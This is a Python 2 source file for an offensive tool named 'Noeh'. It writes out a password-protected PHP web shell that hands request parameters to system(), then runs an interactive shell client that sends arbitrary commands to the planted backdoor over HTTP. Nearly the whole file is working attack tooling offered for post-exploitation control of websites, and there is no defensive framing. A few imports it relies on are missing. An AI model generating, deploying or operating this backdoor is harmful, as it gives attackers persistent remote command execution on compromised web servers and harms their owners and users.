# -*- coding: utf-8 -*-

from requests import *
import os

try:
	from colorama import *
	init()
	class color:
		win = Fore.GREEN+"[+] "+Fore.RESET
		adv = Fore.YELLOW+"[!] "+Fore.RESET
		error = Fore.RED+"[-] "+Fore.RESET
		yellow = Fore.YELLOW
		green = Fore.GREEN
		none = Fore.RESET
except ImportError:
	class color:
		win = "[+] "
		adv = "[!] "
		error = "[-] "
		yellow = ""
		green = ""
		none = ""

logo = "[Noeh]"
logaso = """
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O   Code written by {}DtxdF{}
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX /
 / XXXXXX /
(________(                
 `------'      Bang({}Pre-Explotation{}) Bang({}Explotation{}) Bang({}Post-Explotation{})
 
 info: {}It is a code written in python to generate backdoors in PHP format for soon in a\n post-splash to interact with the website remotely, Use the command [info] to show the information and help.{}
""".format(color.yellow, color.none, color.green, color.none, color.green, color.none, color.green, color.none, color.yellow, color.none)

def connt_status(target):
	
	try:
		target = get(target)
		if int(target.status_code) == 404:
			return False
		else:
			return True
	except exceptions.MissingSchema:
		raise exceptions.MissingSchema("Invalid url")
	except exceptions.ConnectionError:
		return False
		
def generate(file, passwd):

	print color.adv+"Generating PHP Payload: %s" % (str(file))
	open(file, "wb").write("<?php $confirm = 'True'; if(isset($_REQUEST['noeh'])) {$confirm = 'False';echo 'True';};if($confirm == 'True'){if(isset($_REQUEST['cmd'])&isset($_REQUEST['passwd'])){if($_REQUEST['passwd'] == '"+passwd+"') {$cmd = ($_REQUEST['cmd']); system($cmd); die; } else {echo 'The value of passwd is incorrect';}} else {echo 'The parameters not defined!';}}?>")
	if os.path.exists(file):
		print color.win+"Payload generated: %s, Bytes: %s" % (str(file), str(len(open(file, "rb").read())))
	else:
		print color.error+"Payload not generated ..."
	
def main():

	print str(logaso)

	while True:

		try:
		
			debug_file = raw_input(logo+" > ")
			
			if not debug_file:
				continue
			if debug_file.split()[0].lower() == 'generate':
				if debug_file.split()[1].lower() == 'out':
					outfile = debug_file.split()[2]
					if not outfile == '':
						if debug_file.split()[3].lower() == 'passwd':
							passwd = debug_file.split()[4]
							if not passwd == '':
								generate(outfile, passwd)
							else:
								print color.error+"The parameter 'passwd' is not defined ..."
						else:
							print color.error+"Unknown parameter: %s" % (str(debug_file.split()[3]))
					else:
						print color.error+"The parameter 'outfile' is not defined ..."
				else:
					print color.error+"Unknown parameter: %s" % (str(debug_file.split()[1]))
			elif debug_file.split()[0].lower() == 'conn_addr':
				if debug_file.split()[1].lower().partition("http://")[1] == 'http://':
					connt = True
					http_page = debug_file.split()[1]
					if debug_file.split()[2].lower() == 'passwd':
						http_page_passwd = debug_file.split()[3]
						if http_page_passwd == '':
							print color.adv+"The parameter 'passwd' is not defined"
					else:
						connt = False
						print color.error+"Unknown parameter: %s" % (debug_file.split()[3])
				elif debug_file.split()[1].lower().partition("https://")[1] == 'https://':
					connt = True
					http_page = debug_file.split()[1]
					if debug_file.split()[2].lower() == 'passwd':
						http_page_passwd = debug_file.split()[3]
						if http_page_passwd == '':
							http_page_passwd = b64encode(str(uuid.uuid4()))
							print color.adv+"The parameter 'passwd' is not defined" 
					else:
						connt = False
						print color.error+"Unknown parameter: %s" % (debug_file.split()[2])
				else:
					connt = False
					print color.error+"Unknown protocol, Select 'http' or 'https'"
				if connt:
					try:
						target_object = get(http_page)
						http_status = target_object.status_code
					except exceptions.ConnectionError:
						http_status = 404
					if http_status == 200:
						if get(http_page+"?noeh").text.title() == 'True':
							while True:
								debug_file = raw_input(logo+"[Shell:%s] > " % (str(http_page)))
								if not debug_file:
									continue
								if debug_file.split()[0].lower() == 'exit':
									break
								else:
									print "\nSending: %s/?passwd=%s&cmd=%s" % (str(http_page),str(http_page_passwd),str(debug_file))
									print "Response: %s" % ("["+str(get(http_page).status_code)+"]")
									if connt_status(http_page):
										payload = get(http_page+"?passwd=%s&cmd=%s" % (str(http_page_passwd),str(debug_file))).text.encode("utf-8")
										if not payload == '':
											print str(payload)
										else:
											print "[None]"
									else:
										print color.error+"Lost connection with the target URL: %s, Code: %s\n" % (str(http_page), "["+str(get(http_page).status_code)+"]")
						else:
							print color.error+"Error, The indicated url is not associated with noeh"
					else:
						print color.error+"Error, in the status code: %s" % (str(http_status))
			elif debug_file.split()[0].lower() == 'info':
				print str(logaso)
				print "Parameters to generate a payload:"
				print "generate out <Name of the payload> passwd <Password>"
				print "Example: "+"[!] Generating PHP Payload: test.php\n[+] Payload generated: test.php, Bytes: 343"
				print "\nParameters to connect to a website"
				print "conn_addr <HTTP_URL> passwd <Password>"
				print "Example: "+logo+"[Shell:Target_URL] > <command's> \n"
			elif debug_file.split()[0].lower() == 'exit':
				exit()
			else:
				print color.error+"Unknown command: %s" % (str(debug_file))

		except KeyboardInterrupt:
			print color.adv+"CTRL-C"
		except EOFError:
			print color.adv+"Invalid key o parameter!"
		except IndexError:
			print color.adv+"An parameter is necessary"
		except Exception as a:
			print color.adv+"Exception: %s" % (str(a))
				
if __name__ == '__main__':
	main()